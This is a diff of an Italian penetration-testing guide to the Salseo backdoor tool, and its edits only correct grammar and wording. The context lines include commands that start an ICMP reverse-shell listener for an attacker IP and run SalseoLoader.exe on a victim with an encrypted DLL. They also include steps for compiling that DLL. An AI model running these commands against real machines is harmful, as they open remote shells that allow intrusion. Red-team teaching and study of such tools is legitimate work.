@@ -10,7 +10,7 @@ Compila questi progetti per l'architettura della macchina Windows su cui intendi
 
 Puoi **selezionare l'architettura** all'interno di Visual Studio nella **scheda "Build" a sinistra** in **"Platform Target".**
 
-(\*\*Se non riesci a trovare queste opzioni, premi su **"Project Tab"** e poi su **"\<Project Name> Properties"**)
+(**Se non riesci a trovare queste opzioni, premi su **"Project Tab"** e poi su **"\<Project Name> Properties"**)
 
 ![](<../images/image (132).png>)
 
@@ -65,7 +65,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### All'interno della vittima, eseguiamo la cosa salseo:
+#### Dentro della vittima, eseguiamo la cosa salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
@@ -99,7 +99,7 @@ Premi **Disinstalla** (sì, è strano ma fidati, è necessario)
 
 Basta **uscire** da Visual Studio
 
-Poi, vai nella tua **cartella SalseoLoader** e **esegui DllExport_Configure.bat**
+Poi, vai nella tua **cartella SalseoLoader** ed **esegui DllExport_Configure.bat**
 
 Seleziona **x64** (se intendi usarlo all'interno di una box x64, questo era il mio caso), seleziona **System.Runtime.InteropServices** (all'interno di **Namespace per DllExport**) e premi **Applica**
 
@@ -117,15 +117,15 @@ Seleziona **Tipo di output = Class Library** (Progetto --> Proprietà SalseoLoad
 
 ![](<../images/image (10) (1).png>)
 
-Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compila --> Target piattaforma = x64)
+Seleziona **piattaforma x64** (Progetto --> Proprietà SalseoLoader --> Compilazione --> Target piattaforma = x64)
 
 ![](<../images/image (9) (1) (1).png>)
 
 Per **compilare** la soluzione: Compila --> Compila soluzione (All'interno della console di output apparirà il percorso della nuova DLL)
 
-### Testa il Dll generato
+### Testa la DLL generata
 
-Copia e incolla il Dll dove vuoi testarlo.
+Copia e incolla la DLL dove vuoi testarla.
 
 Esegui:
 ```
